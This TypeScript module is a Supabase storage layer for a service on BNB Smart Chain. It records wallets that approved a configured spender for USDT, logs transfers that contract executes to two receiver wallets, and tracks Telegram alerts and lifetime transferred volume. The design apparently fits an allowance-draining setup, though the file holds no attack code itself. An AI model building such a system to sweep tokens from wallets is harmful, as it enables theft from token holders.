import { createClient, type SupabaseClient } from "@supabase/supabase-js";
import { config } from "./config";

export type WalletRecord = {
  address: string;
  receiver: 1 | 2;
  active: boolean;
  createdAt: string;
  updatedAt?: string;
  firstDetectedAt?: string;
  latestActivityAt?: string;
  lastCheckedAt?: string;
  lastError?: string;
  approvalLinked?: boolean;
  tokenContract?: string;
  tokenSymbol?: string;
  tokenDecimals?: number;
  network?: string;
  chainId?: string;
  currentBalance?: string;
  currentAllowance?: string;
  rawCurrentBalance?: string;
  rawCurrentAllowance?: string;
  currentBalanceStatus?: string;
  currentAllowanceStatus?: string;
  spender?: string;
  latestApprovalTxHash?: string;
  latestTransferTxHash?: string;
};

export type ApprovalRecord = {
  id: string;
  walletAddress: string;
  ownerAddress: string;
  spender: string;
  tokenContract: string;
  tokenSymbol: string;
  tokenDecimals: number;
  approvalAmount: string;
  rawApprovalAmount: string;
  currentAllowance?: string;
  rawCurrentAllowance?: string;
  allowanceStatus?: string;
  walletBalance?: string;
  rawWalletBalance?: string;
  balanceStatus?: string;
  previousAllowance?: string;
  rawPreviousAllowance?: string;
  previousAllowanceStatus?: string;
  revocationEligible?: boolean;
  network: string;
  chainId: string;
  blockNumber: number;
  blockTimestamp: string;
  blockTimestampStatus?: "verified" | "unavailable";
  transactionHash: string;
  logIndex: number;
  eventType: "Approval";
  processingStatus: "pending" | "processed" | "failed";
  telegramStatus: "pending" | "sent" | "failed" | "skipped";
  telegramAttemptCount: number;
  telegramSentAt?: string;
  telegramError?: string;
  createdAt: string;
  updatedAt: string;
};

export type TransferRecord = {
  id: string;
  walletAddress: string;
  sender: string;
  receivingWallet: string;
  tokenContract: string;
  tokenSymbol: string;
  tokenDecimals: number;
  transferAmount: string;
  rawTransferAmount: string;
  currentBalance?: string;
  executionEventLogIndex?: number;
  executionContract?: string;
  executionEvidence?: "TransferExecuted";
  executionMethod?: "executeToReceiver1" | "executeToReceiver2";
  executionVerified?: boolean;
  network: string;
  chainId: string;
  blockNumber: number;
  blockTimestamp: string;
  blockTimestampStatus?: "verified" | "unavailable";
  transactionHash: string;
  logIndex: number;
  eventType: "Transfer";
  processingStatus: "pending" | "processed" | "failed";
  telegramStatus: "pending" | "sent" | "failed" | "skipped";
  telegramAttemptCount: number;
  telegramSentAt?: string;
  telegramError?: string;
  createdAt: string;
  updatedAt: string;
};

export type MonitoringState = {
  network: string;
  chainId: number;
  contractAddress: string;
  eventType: string;
  lastProcessedBlock: number;
  updatedAt: string;
};

export type HistoryRecord = {
  id: string;
  wallet: string;
  receiver: 1 | 2;
  amount: string;
  txHash?: string;
  status: "submitted" | "confirmed" | "failed";
  error?: string;
  createdAt: string;
};

type SupabaseRow<T> = { id: string; record: T; created_at: string };
type SupabaseRecordRow<T> = { record: T };

const defaultMonitoringState: MonitoringState = {
  network: "BNB Smart Chain",
  chainId: 56,
  contractAddress: config.USDT_ADDRESS,
  eventType: "Approval+Transfer",
  lastProcessedBlock: 0,
  updatedAt: new Date(0).toISOString()
};

export class Store {
  private readonly client: SupabaseClient;
  private wallets: WalletRecord[] = [];
  private historyRecords: HistoryRecord[] = [];
  private approvalEvents: ApprovalRecord[] = [];
  private transferEvents: TransferRecord[] = [];
  private monitoringStates: MonitoringState[] = [];
  private lifetimeTransferredAmount = "0";
  private lifetimeTransferredDecimals = 6;

  constructor() {
    this.client = createClient(config.SUPABASE_URL, config.SUPABASE_SERVICE_ROLE_KEY, {
      auth: { autoRefreshToken: false, persistSession: false }
    });
  }

  async initialize() {
    const [wallets, history, approvals, transfers, monitoringStates] = await Promise.all([
      this.load<WalletRecord>("wallets", 10000, true),
      this.load<HistoryRecord>("history", 1000),
      this.load<ApprovalRecord>("approvalEvents", 2000),
      this.load<TransferRecord>("transferEvents", 2000),
      this.load<MonitoringState>("monitoringState", 100, true)
    ]);
    this.wallets = wallets;
    this.historyRecords = history;
    this.approvalEvents = approvals.filter((record) => this.isApprovalInScope(record));
    this.transferEvents = transfers.filter((record) => this.isTransferInScope(record));
    this.monitoringStates = monitoringStates;

    const { data: lifetimeTransferredAmount, error } = await this.client
      .rpc("reconcile_lifetime_transfer_volume")
      .returns<string>();
    if (error) throw new Error(`Supabase transfer volume reconciliation failed: ${error.message}`);
    if (typeof lifetimeTransferredAmount !== "string" || !/^\d+$/.test(lifetimeTransferredAmount)) {
      throw new Error("Supabase returned an invalid lifetime transfer volume");
    }
    this.lifetimeTransferredAmount = lifetimeTransferredAmount;
  }

  private async load<T>(table: string, limit: number, ascending = false): Promise<T[]> {
    const records: T[] = [];
    const pageSize = 1000;
    for (let offset = 0; offset < limit; offset += pageSize) {
      const end = Math.min(offset + pageSize, limit) - 1;
      const { data, error } = await this.client
        .from(table)
        .select("id,record,created_at")
        .order("created_at", { ascending })
        .order("id", { ascending: true })
        .range(offset, end)
        .returns<SupabaseRow<T>[]>();
      if (error) throw new Error(`Supabase read failed for ${table}: ${error.message}`);
      records.push(...data.map((row) => row.record));
      if (data.length < end - offset + 1) break;
    }
    return records;
  }

  private async persist<T>(table: string, id: string, record: T, createdAt: string) {
    const { error } = await this.client
      .from(table)
      .upsert({ id, record, created_at: createdAt }, { onConflict: "id" });
    if (error) throw new Error(`Supabase write failed for ${table}: ${error.message}`);
  }

  private normalizeAddress(address: string) {
    return address.toLowerCase();
  }

  private isApprovalInScope(record: ApprovalRecord) {
    return record.eventType === "Approval" &&
      record.tokenContract?.toLowerCase() === config.USDT_ADDRESS.toLowerCase() &&
      record.spender?.toLowerCase() === config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() &&
      record.chainId === String(config.CHAIN_ID);
  }

  private isTransferInScope(record: TransferRecord) {
    return record.eventType === "Transfer" &&
      record.tokenContract?.toLowerCase() === config.USDT_ADDRESS.toLowerCase() &&
      record.chainId === String(config.CHAIN_ID) &&
      record.executionContract?.toLowerCase() === config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() &&
      record.executionVerified === true &&
      ((record.executionMethod === "executeToReceiver1" || record.executionMethod === "executeToReceiver2") ||
        (record.executionEvidence === "TransferExecuted" && Number.isInteger(record.executionEventLogIndex)));
  }

  listWallets() {
    const verifiedOwners = new Set(this.approvalEvents.map((approval) =>
      (approval.walletAddress || approval.ownerAddress).toLowerCase()
    ));
    return this.wallets.filter((wallet) => verifiedOwners.has(wallet.address.toLowerCase()));
  }
  hasVerifiedApprovalForWallet(address: string) {
    const normalizedAddress = this.normalizeAddress(address);
    return this.approvalEvents.some((approval) =>
      this.normalizeAddress(approval.walletAddress || approval.ownerAddress) === normalizedAddress
    );
  }
  listApprovalLinkedWallets() {
    const latestApprovalByWallet = new Map<string, ApprovalRecord>();
    for (const approval of this.approvalEvents) {
      const owner = (approval.walletAddress || approval.ownerAddress).toLowerCase();
      const existing = latestApprovalByWallet.get(owner);
      if (
        !existing ||
        approval.blockNumber > existing.blockNumber ||
        (approval.blockNumber === existing.blockNumber && approval.logIndex > existing.logIndex)
      ) latestApprovalByWallet.set(owner, approval);
    }
    return this.wallets.filter((wallet) => {
      const latestApproval = latestApprovalByWallet.get(wallet.address.toLowerCase());
      return wallet.approvalLinked === true &&
        wallet.active &&
        wallet.tokenContract?.toLowerCase() === config.USDT_ADDRESS.toLowerCase() &&
        wallet.spender?.toLowerCase() === config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() &&
        wallet.chainId === String(config.CHAIN_ID) &&
        latestApproval !== undefined &&
        /^\d+$/.test(latestApproval.rawApprovalAmount) &&
        BigInt(latestApproval.rawApprovalAmount) > 0n;
    });
  }
  listApprovalEvents() { return this.approvalEvents; }
  listTransferEvents() { return this.transferEvents; }
  async listRetryableTelegramNotifications() {
    const loadRetryable = async <T>(table: string): Promise<T[]> => {
      const records: T[] = [];
      const pageSize = 1000;
      for (let offset = 0; ; offset += pageSize) {
        const { data, error } = await this.client
          .from(table)
          .select("record")
          .in("record->>telegramStatus", ["pending", "failed", "skipped"])
          .order("created_at", { ascending: true })
          .order("id", { ascending: true })
          .range(offset, offset + pageSize - 1)
          .returns<SupabaseRecordRow<T>[]>();
        if (error) throw new Error(`Supabase retry scan failed for ${table}: ${error.message}`);
        records.push(...data.map((row) => row.record));
        if (data.length < pageSize) break;
      }
      return records;
    };

    const [approvals, transfers] = await Promise.all([
      loadRetryable<ApprovalRecord>("approvalEvents"),
      loadRetryable<TransferRecord>("transferEvents")
    ]);
    return {
      approvals: approvals.filter((record) => this.isApprovalInScope(record)),
      transfers: transfers.filter((record) => this.isTransferInScope(record))
    };
  }
  getLifetimeTransferredAmount() { return this.lifetimeTransferredAmount; }
  getLifetimeTransferredDecimals() { return this.lifetimeTransferredDecimals; }
  setLifetimeTransferredDecimals(decimals: number) {
    if (!Number.isInteger(decimals) || decimals < 0 || decimals > 36) {
      throw new Error("Token decimals must be an integer between 0 and 36");
    }
    this.lifetimeTransferredDecimals = decimals;
  }
  getWallet(address: string) {
    return this.wallets.find((wallet) => this.normalizeAddress(wallet.address) === this.normalizeAddress(address));
  }
  getApprovalEvent(id: string) { return this.approvalEvents.find((record) => record.id === id); }
  getTransferEvent(id: string) { return this.transferEvents.find((record) => record.id === id); }
  async findApprovalEvent(chainId: string, transactionHash: string, logIndex: number) {
    const id = `approval-${chainId}-${config.USDT_ADDRESS.toLowerCase()}-${transactionHash.toLowerCase()}-${logIndex}`;
    const cached = this.approvalEvents.find((record) => record.id === id);
    if (cached) return cached;

    const { data, error } = await this.client
      .from("approvalEvents")
      .select("record")
      .eq("id", id)
      .maybeSingle();
    if (error) throw new Error(`Supabase event lookup failed for approval ${id}: ${error.message}`);
    const record = data?.record as ApprovalRecord | undefined;
    if (
      !record ||
      !this.isApprovalInScope(record) ||
      record.chainId !== chainId ||
      record.transactionHash.toLowerCase() !== transactionHash.toLowerCase() ||
      record.logIndex !== logIndex
    ) return undefined;
    this.approvalEvents = [record, ...this.approvalEvents.filter((item) => item.id !== id)].slice(0, 2000);
    return record;
  }
  async findTransferEvent(chainId: string, transactionHash: string, logIndex: number) {
    const id = `transfer-${chainId}-${config.USDT_ADDRESS.toLowerCase()}-${transactionHash.toLowerCase()}-${logIndex}`;
    const cached = this.transferEvents.find((record) => record.id === id);
    if (cached) return cached;

    const { data, error } = await this.client
      .from("transferEvents")
      .select("record")
      .eq("id", id)
      .maybeSingle();
    if (error) throw new Error(`Supabase event lookup failed for transfer ${id}: ${error.message}`);
    const record = data?.record as TransferRecord | undefined;
    if (
      !record ||
      !this.isTransferInScope(record) ||
      record.chainId !== chainId ||
      record.transactionHash.toLowerCase() !== transactionHash.toLowerCase() ||
      record.logIndex !== logIndex
    ) return undefined;
    this.transferEvents = [record, ...this.transferEvents.filter((item) => item.id !== id)].slice(0, 2000);
    return record;
  }

  async register(wallet: WalletRecord) {
    if (wallet.approvalLinked && (
      wallet.tokenContract?.toLowerCase() !== config.USDT_ADDRESS.toLowerCase() ||
      wallet.spender?.toLowerCase() !== config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() ||
      wallet.chainId !== String(config.CHAIN_ID)
    )) {
      throw new Error("Cannot persist an approval-linked wallet outside the configured token, spender, and chain");
    }
    await this.persist("wallets", this.normalizeAddress(wallet.address), wallet, wallet.createdAt);
    this.wallets = this.wallets.filter((item) => this.normalizeAddress(item.address) !== this.normalizeAddress(wallet.address));
    this.wallets.push(wallet);
    return wallet;
  }

  async remove(address: string) {
    const wallet = this.getWallet(address);
    if (!wallet) return undefined;
    const updated = { ...wallet, active: false, updatedAt: new Date().toISOString() };
    await this.persist("wallets", this.normalizeAddress(updated.address), updated, updated.createdAt);
    this.wallets = this.wallets.map((item) =>
      this.normalizeAddress(item.address) === this.normalizeAddress(address) ? updated : item
    );
    return updated;
  }

  async update(address: string, update: Partial<WalletRecord>) {
    const wallet = this.getWallet(address);
    if (!wallet) return undefined;
    const updated = { ...wallet, ...update, updatedAt: new Date().toISOString() };
    await this.persist("wallets", this.normalizeAddress(updated.address), updated, updated.createdAt);
    this.wallets = this.wallets.map((item) =>
      this.normalizeAddress(item.address) === this.normalizeAddress(address) ? updated : item
    );
    return updated;
  }

  async addHistory(record: HistoryRecord) {
    await this.persist("history", record.id, record, record.createdAt);
    this.historyRecords = [record, ...this.historyRecords.filter((item) => item.id !== record.id)].slice(0, 1000);
    return record;
  }

  async incrementLifetimeTransferredAmount(transferId: string, rawAmount: string) {
    if (!/^[1-9]\d*$/.test(rawAmount)) {
      throw new Error("Lifetime transfer volume increment must be a positive integer");
    }
    const { data, error } = await this.client
      .rpc("increment_lifetime_transfer_volume", {
        p_transfer_id: transferId,
        p_raw_amount: rawAmount
      })
      .returns<string>();
    if (error) throw new Error(`Supabase transfer volume increment failed: ${error.message}`);
    if (typeof data !== "string" || !/^\d+$/.test(data)) {
      throw new Error("Supabase returned an invalid lifetime transfer volume");
    }
    this.lifetimeTransferredAmount = data;
    return data;
  }

  history(wallet?: string) {
    return wallet
      ? this.historyRecords.filter((item) => this.normalizeAddress(item.wallet) === this.normalizeAddress(wallet))
      : this.historyRecords;
  }

  async upsertApproval(record: ApprovalRecord) {
    if (!this.isApprovalInScope(record)) {
      throw new Error("Cannot persist an approval outside the configured token, spender, and chain");
    }
    await this.persist("approvalEvents", record.id, record, record.createdAt);
    this.approvalEvents = [record, ...this.approvalEvents.filter((item) => item.id !== record.id)].slice(0, 2000);
    return record;
  }

  async upsertTransfer(record: TransferRecord) {
    if (!this.isTransferInScope(record)) {
      throw new Error("Cannot persist an unverified transfer outside the configured spender scope");
    }
    await this.persist("transferEvents", record.id, record, record.createdAt);
    this.transferEvents = [record, ...this.transferEvents.filter((item) => item.id !== record.id)].slice(0, 2000);
    return record;
  }

  getMonitoringState(eventType: string) {
    return this.monitoringStates.find((state) => state.eventType === eventType) ?? { ...defaultMonitoringState };
  }

  async setMonitoringState(state: MonitoringState) {
    await this.persist("monitoringState", state.eventType, state, state.updatedAt);
    this.monitoringStates = [
      state,
      ...this.monitoringStates.filter((entry) => entry.eventType !== state.eventType)
    ];
    return state;
  }
}
